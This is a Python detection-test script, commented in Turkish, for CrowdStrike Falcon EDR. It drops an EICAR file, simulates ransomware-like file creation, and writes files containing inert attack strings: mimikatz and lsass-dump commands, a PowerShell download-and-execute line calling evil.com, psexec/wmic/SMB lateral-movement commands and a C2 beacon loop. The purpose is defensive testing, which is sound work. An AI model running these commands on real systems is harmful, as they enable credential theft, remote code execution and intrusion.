#!/usr/bin/env python3
"""
CrowdStrike Falcon Detection Tests
Python Edition

Bu script CrowdStrike Falcon EDR'ın tespitlerini doğrulamak için güvenli testler yapar.
SADECE TEST ORTAMINDA KULLANIN!
"""

import os
import sys
import time
import tempfile
import shutil
import subprocess
from datetime import datetime
from pathlib import Path

class Colors:
    """Terminal renkleri"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class CrowdStrikeTester:
    def __init__(self):
        self.test_count = 0
        self.detected_count = 0
        self.log_file = os.path.join(
            tempfile.gettempdir(),
            f"CrowdStrikeTest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        )
        
    def log(self, message, level="INFO"):
        """Log mesajı yaz"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        color_map = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED
        }
        
        color = color_map.get(level, Colors.END)
        print(f"{color}{log_entry}{Colors.END}")
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')
    
    def check_falcon_sensor(self):
        """CrowdStrike Falcon Sensor kontrolü (Windows)"""
        if os.name != 'nt':
            self.log("Bu test Windows için tasarlanmıştır", "WARNING")
            return True
            
        try:
            # Windows service kontrolü
            result = subprocess.run(
                ['sc', 'query', 'CSAgent'],
                capture_output=True,
                text=True
            )
            
            if 'RUNNING' in result.stdout:
                self.log("CrowdStrike Falcon Sensor çalışıyor", "SUCCESS")
                return True
            elif result.returncode == 0:
                self.log("CrowdStrike Sensor yüklü ama çalışmıyor!", "ERROR")
                return False
            else:
                self.log("CrowdStrike Falcon Sensor bulunamadı!", "ERROR")
                return False
        except Exception as e:
            self.log(f"Sensor kontrolü yapılamadı: {str(e)}", "WARNING")
            return True  # Linux/Mac'te devam et
    
    def print_banner(self):
        """Banner yazdır"""
        print("\n" + "=" * 70)
        print(f"{Colors.CYAN}  CROWDSTRIKE FALCON DETECTION TEST SUITE{Colors.END}")
        print(f"{Colors.YELLOW}  Python Edition - Safe Detection Tests{Colors.END}")
        print("=" * 70 + "\n")
        
    def test_eicar(self):
        """Test 1: EICAR standart test dosyası"""
        self.test_count += 1
        print(f"\n[{self.test_count}] EICAR Standart Test Dosyası")
        self.log("EICAR test dosyası oluşturuluyor...", "INFO")
        
        try:
            eicar_string = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
            eicar_path = os.path.join(tempfile.gettempdir(), 'eicar_test.com')
            
            with open(eicar_path, 'w') as f:
                f.write(eicar_string)
            
            time.sleep(3)
            
            if os.path.exists(eicar_path):
                self.log("UYARI: EICAR dosyası tespit EDİLMEDİ!", "WARNING")
                try:
                    os.remove(eicar_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: EICAR dosyası tespit edildi ve engellendi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: EICAR yazma girişimi engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_credential_access_ioa(self):
        """Test 2: Credential Access IOA"""
        self.test_count += 1
        print(f"\n[{self.test_count}] IOA Tespiti - Credential Access Pattern")
        self.log("Credential access string'leri test ediliyor...", "INFO")
        
        try:
            cred_content = """
# SADECE TEST - Bu gerçek tool değildir
# CrowdStrike IOA tespitini test eder

# Credential Dumping Keywords (Test Only)
# mimikatz sekurlsa::logonpasswords
# privilege::debug token::elevate
# lsadump::sam lsadump::secrets
# procdump -ma lsass.exe lsass.dmp

# Password spraying patterns
# net user /domain
# nltest /domain_trusts

Test file for Credential Access IOA detection
"""
            
            cred_path = os.path.join(tempfile.gettempdir(), 'cred_access_test.txt')
            
            with open(cred_path, 'w') as f:
                f.write(cred_content)
            
            time.sleep(3)
            
            if os.path.exists(cred_path):
                self.log("INFO: String-based IOA tespiti aktif değil (normal olabilir)", "INFO")
                try:
                    os.remove(cred_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: Credential access IOA tespit edildi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: Dosya yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_powershell_obfuscation(self):
        """Test 3: PowerShell Obfuscation IOA"""
        self.test_count += 1
        print(f"\n[{self.test_count}] PowerShell Obfuscation Pattern")
        self.log("Obfuscated PowerShell pattern test ediliyor...", "INFO")
        
        try:
            ps_obfuscated = """
# SADECE TEST - Bu script çalıştırılmaz
# CrowdStrike PowerShell behavioral detection'ını test eder

# Obfuscation patterns (commented):
# powershell -w hidden -nop -enc BASE64ENCODED
# $a=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('encoded'))
# IEX(New-Object Net.WebClient).DownloadString('http://evil.com')
# ${e`N`V:co`Mm`ON`pR`o`GR`AMf`i`Le`s}

Test for obfuscation detection - No actual code execution
"""
            
            ps_path = os.path.join(tempfile.gettempdir(), 'ps_obfuscation_test.ps1')
            
            with open(ps_path, 'w') as f:
                f.write(ps_obfuscated)
            
            time.sleep(3)
            
            if os.path.exists(ps_path):
                self.log("INFO: PowerShell script file tespiti aktif değil", "INFO")
                try:
                    os.remove(ps_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: PowerShell obfuscation pattern tespit edildi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: Script yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_rapid_file_operations(self):
        """Test 4: Hızlı dosya operasyonları (Ransomware behavior)"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Machine Learning IOA - Ransomware Behavior")
        self.log("Hızlı dosya operasyonu pattern test ediliyor...", "INFO")
        
        try:
            test_folder = os.path.join(tempfile.gettempdir(), 'rapid_ops_test_cs')
            os.makedirs(test_folder, exist_ok=True)
            
            files_created = 0
            file_extensions = ['.doc', '.xls', '.pdf', '.txt', '.jpg', '.png']
            
            # Hızlı dosya oluşturma
            for i in range(50):
                try:
                    ext = file_extensions[i % len(file_extensions)]
                    file_path = os.path.join(test_folder, f'document_{i}{ext}')
                    
                    with open(file_path, 'w') as f:
                        f.write(f'Original content {i} - {datetime.now().timestamp()}')
                    
                    files_created += 1
                    time.sleep(0.05)  # Hızlı oluşturma simülasyonu
                except:
                    break
            
            time.sleep(3)
            
            if files_created >= 45:
                self.log(f"INFO: Ransomware behavioral pattern engellemedi ({files_created}/50)", "INFO")
            else:
                self.log(f"BAŞARILI: Ransomware behavior tespit edildi ({files_created}/50)", "SUCCESS")
                self.detected_count += 1
            
            # Temizlik
            try:
                shutil.rmtree(test_folder)
            except:
                pass
                
        except Exception as e:
            self.log(f"BAŞARILI: Dosya işlemi engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_lateral_movement_pattern(self):
        """Test 5: Lateral Movement IOA"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Lateral Movement IOA - Remote Execution")
        self.log("Lateral movement pattern test ediliyor...", "INFO")
        
        try:
            lateral_content = """
# SADECE TEST - Bu gerçek lateral movement değildir
# CrowdStrike lateral movement IOA'sını test eder

# Remote execution patterns (commented):
# psexec.exe \\\\target -u admin -p password cmd.exe
# wmic /node:target process call create "cmd.exe"
# schtasks /create /s target /tn malware /tr "c:\\bad.exe"
# at \\\\target 12:00 c:\\bad.exe

# SMB lateral movement
# net use \\\\target\\c$ /user:admin password
# copy malware.exe \\\\target\\c$\\windows\\temp\\

Test for lateral movement detection
"""
            
            lateral_path = os.path.join(tempfile.gettempdir(), 'lateral_movement_test.txt')
            
            with open(lateral_path, 'w') as f:
                f.write(lateral_content)
            
            time.sleep(3)
            
            if os.path.exists(lateral_path):
                self.log("INFO: Static lateral movement string tespiti aktif değil", "INFO")
                try:
                    os.remove(lateral_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: Lateral movement pattern tespit edildi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: Dosya yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_process_injection_pattern(self):
        """Test 6: Process Injection IOA"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Process Injection IOA Pattern")
        self.log("Process injection pattern test ediliyor...", "INFO")
        
        try:
            injection_content = """
/*
SADECE TEST - Bu kod çalıştırılmaz
CrowdStrike process injection IOA'sını test eder

Common injection API calls (not executed):
- VirtualAllocEx() + WriteProcessMemory() + CreateRemoteThread()
- QueueUserAPC() injection
- SetThreadContext() for thread hijacking
- NtCreateThreadEx() for direct injection
- Process Hollowing via NtUnmapViewOfSection()

Reflective DLL injection techniques
AtomBombing, Process Doppelgänging patterns
*/

Test for process injection behavioral detection
"""
            
            injection_path = os.path.join(tempfile.gettempdir(), 'process_injection_test.c')
            
            with open(injection_path, 'w') as f:
                f.write(injection_content)
            
            time.sleep(3)
            
            if os.path.exists(injection_path):
                self.log("INFO: Static injection string tespiti aktif değil (API-call based)", "INFO")
                try:
                    os.remove(injection_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: Process injection pattern tespit edildi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: Dosya yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_command_and_control_pattern(self):
        """Test 7: Command & Control IOA"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Command & Control Pattern")
        self.log("C2 communication pattern test ediliyor...", "INFO")
        
        try:
            c2_content = """
# SADECE TEST - Bu gerçek C2 değildir
# CrowdStrike network IOA'sını test eder

# C2 beaconing patterns (not executed):
# while True: requests.get('http://c2server.com/beacon')
# Periodic DNS queries to encoded domains
# HTTP/S with custom User-Agent headers

# Cobaltstrike beacon simulation
# GET /activity HTTP/1.1
# Cookie: session=BASE64_ENCODED_DATA

# Domain fronting patterns
# Legitimate-looking domains with custom SNI

Test for C2 communication detection
"""
            
            c2_path = os.path.join(tempfile.gettempdir(), 'c2_pattern_test.py')
            
            with open(c2_path, 'w') as f:
                f.write(c2_content)
            
            time.sleep(3)
            
            if os.path.exists(c2_path):
                self.log("INFO: C2 string pattern tespiti aktif değil (network-based)", "INFO")
                try:
                    os.remove(c2_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: C2 pattern tespit edildi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: Dosya yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def print_results(self):
        """Sonuçları yazdır"""
        print("\n" + "=" * 70)
        print(f"{Colors.CYAN}  TEST SONUÇLARI{Colors.END}")
        print("=" * 70 + "\n")
        
        detection_rate = (self.detected_count / self.test_count * 100) if self.test_count > 0 else 0
        
        print(f"Toplam Test: {Colors.BOLD}{self.test_count}{Colors.END}")
        print(f"Tespit Edilen: {Colors.GREEN}{self.detected_count}{Colors.END}")
        
        rate_color = Colors.GREEN if detection_rate >= 75 else Colors.YELLOW if detection_rate >= 50 else Colors.RED
        print(f"Tespit Oranı: {rate_color}{detection_rate:.2f}%{Colors.END}\n")
        
        # CrowdStrike özel yorumlama
        print(f"{Colors.YELLOW}CROWDSTRIKE DETECTION ANALİZİ:{Colors.END}\n")
        
        if detection_rate >= 20:
            self.log("SONUÇ: CrowdStrike Falcon çalışıyor - EDR tespitleri aktif", "SUCCESS")
            print(f"\n{Colors.CYAN}Not: CrowdStrike birçok davranışı ENGELLEME yerine LOGLAMA modunda çalışır.{Colors.END}")
            print(f"{Colors.CYAN}Düşük tespit oranı NORMAL olabilir. Önemli olan:{Colors.END}")
            print("  1. Falcon Console'da event'lerin görünmesi")
            print("  2. Detection'ların loglanması")
            print("  3. Prevention policy'ye göre aksiyonlar")
        elif detection_rate >= 10:
            self.log("SONUÇ: CrowdStrike Falcon aktif ama detection mode'da", "WARNING")
            print(f"\n{Colors.YELLOW}Prevention policy kontrol edin - sadece detection mode olabilir{Colors.END}")
        else:
            self.log("SONUÇ: CrowdStrike Falcon tespiti çok düşük - inceleme gerekli", "ERROR")
            print(f"\n{Colors.RED}Olası sorunlar:{Colors.END}")
            print("  - Sensor tam bağlanmamış olabilir")
            print("  - Prevention policy aktif değil")
            print("  - Host isolation aktif olabilir")
        
        print(f"\nDetaylı log: {self.log_file}\n")
        print(f"{Colors.YELLOW}ÖNEMLİ: FALCON CONSOLE KONTROLÜ{Colors.END}")
        print("=" * 70)
        print("1. Falcon Console → Investigate → Activity Logs")
        print("2. Hostname ile arama yapın")
        print("3. Son 1 saatteki event'leri filtreleyin")
        print("4. Detection type'lara göre sıralayın:")
        print(f"   {Colors.CYAN}- Malware detections (EICAR){Colors.END}")
        print(f"   {Colors.CYAN}- IOA detections (Behavioral patterns){Colors.END}")
        print(f"   {Colors.CYAN}- Machine Learning detections{Colors.END}")
        print("5. Prevention policy'nizi kontrol edin (Detect vs Prevent)")
        print("\n" + "=" * 70 + "\n")

def main():
    """Ana fonksiyon"""
    tester = CrowdStrikeTester()
    
    tester.print_banner()
    tester.log("Test başlatılıyor...", "INFO")
    tester.log(f"Log dosyası: {tester.log_file}", "INFO")
    
    # Sensor kontrolü
    if not tester.check_falcon_sensor():
        print(f"\n{Colors.RED}HATA: CrowdStrike Falcon Sensor aktif değil!{Colors.END}")
        print(f"{Colors.YELLOW}Lütfen sensor'ün yüklü ve çalışır durumda olduğundan emin olun.{Colors.END}\n")
        input("Devam etmek için Enter'a basın (Ctrl+C ile çıkış)...")
    
    print()
    
    # Testleri çalıştır
    tester.test_eicar()
    tester.test_credential_access_ioa()
    tester.test_powershell_obfuscation()
    tester.test_rapid_file_operations()
    tester.test_lateral_movement_pattern()
    tester.test_process_injection_pattern()
    tester.test_command_and_control_pattern()
    
    # Sonuçları göster
    tester.print_results()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Test kullanıcı tarafından iptal edildi.{Colors.END}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Hata oluştu: {str(e)}{Colors.END}\n")
        sys.exit(1)
